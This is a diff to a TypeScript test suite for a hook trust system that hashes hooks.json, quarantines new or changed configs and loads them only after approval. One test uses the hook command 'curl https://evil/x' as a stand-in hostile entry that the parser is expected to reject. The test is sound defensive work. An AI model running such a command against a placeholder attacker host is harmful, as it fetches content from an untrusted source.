@@ -28,6 +28,7 @@ import {
 import { runHookTrustWorkflow } from "../hook-trust-prompt.js";
 import { acceptHookTrust, listHookTrustState } from "../hook-trust-commands.js";
 import { wireHookSystem } from "../../boot/steps/hook-system-wiring.js";
+import { writeJsonConfig } from "./test-helpers.js";
 
 let tmpDir: string;
 let hooksDir: string;
@@ -50,10 +51,6 @@ afterEach(() => {
 
 function opts() {
   return { hooksDir, disabledDir, lockfilePath };
-}
-
-function writeConfig(obj: unknown): void {
-  writeFileSync(configPath, JSON.stringify(obj, null, 2));
 }
 
 function writeScript(name: string, body: string): string {
@@ -82,9 +79,9 @@ describe("loadHookConfig — composite trust hash", () => {
   });
 
   it("hash changes when hooks.json bytes change", () => {
-    writeConfig(ALLOW_CONFIG);
+    writeJsonConfig(configPath, ALLOW_CONFIG);
     const h1 = loadHookConfig(configPath).trustHash;
-    writeConfig({ ...ALLOW_CONFIG, version: 2 });
+    writeJsonConfig(configPath, { ...ALLOW_CONFIG, version: 2 });
     const h2 = loadHookConfig(configPath).trustHash;
     expect(h1).not.toBeNull();
     expect(h1).not.toBe(h2);
@@ -92,7 +89,7 @@ describe("loadHookConfig — composite trust hash", () => {
 
   it("hash changes when a REFERENCED local script changes (composite)", () => {
     writeScript("policy.sh", "#!/bin/sh\necho '{\"action\":\"allow\",\"reason\":\"v1\"}'");
-    writeConfig({
+    writeJsonConfig(configPath, {
       version: 1,
       hooks: { PreToolUse: [{ hooks: [{ type: "command", command: join(hooksDir, "policy.sh") }] }] },
     });
@@ -104,7 +101,7 @@ describe("loadHookConfig — composite trust hash", () => {
   });
 
   it("binary-only commands are rejected at parse → no runnable entries", () => {
-    writeConfig({
+    writeJsonConfig(configPath, {
       version: 1,
       hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl https://evil/x" }] }] },
     });
@@ -123,7 +120,7 @@ describe("loadHookConfig — composite trust hash", () => {
 
 describe("hooks.json TOFU diff — quarantine by default", () => {
   it("a NEW hooks.json is quarantined (strict-deny, no dispatcher)", async () => {
-    writeConfig(ALLOW_CONFIG);
+    writeJsonConfig(configPath, ALLOW_CONFIG);
     const result = await runHookTrustWorkflow(opts());
     // The synthetic config hook was quarantined; commands never load.
     expect(result.disabledHooks.map((h) => h.fileName)).toContain(HOOKS_CONFIG_FILENAME);
@@ -134,7 +131,7 @@ describe("hooks.json TOFU diff — quarantine by default", () => {
   });
 
   it("a trusted (dispatcher-approved) hooks.json loads its command entries", async () => {
-    writeConfig(ALLOW_CONFIG);
+    writeJsonConfig(configPath, ALLOW_CONFIG);
     const result = await runHookTrustWorkflow({
       ...opts(),
       promptDispatcher: { prompt: async (d) => d.map((x) => ({ fileName: x.hook.fileName, trust: true })) },
@@ -146,14 +143,14 @@ describe("hooks.json TOFU diff — quarantine by default", () => {
   });
 
   it("a CHANGED hooks.json on a later boot is re-quarantined", async () => {
-    writeConfig(ALLOW_CONFIG);
+    writeJsonConfig(configPath, ALLOW_CONFIG);
     // First boot: trust it.
     await runHookTrustWorkflow({
       ...opts(),
       promptDispatcher: { prompt: async (d) => d.map((x) => ({ fileName: x.hook.fileName, trust: true })) },
     });
     // Mutate the config.
-    writeConfig({ ...ALLOW_CONFIG, version: 2 });
+    writeJsonConfig(configPath, { ...ALLOW_CONFIG, version: 2 });
     // Second boot: strict-deny → re-quarantine, commands stop loading.
     const seen: string[] = [];
     const result = await runHookTrustWorkflow({
@@ -173,7 +170,7 @@ describe("hooks.json TOFU diff — quarantine by default", () => {
 
 describe("hooks.json /permission hooks accept restores + loads", () => {
   it("accept restores a quarantined hooks.json and the manager loads its entries", async () => {
-    writeConfig(ALLOW_CONFIG);
+    writeJsonConfig(configPath, ALLOW_CONFIG);
     const boot = await wireHookSystem(opts());
     // Quarantined → registry empty.
     expect(boot.manager.size()).toBe(0);
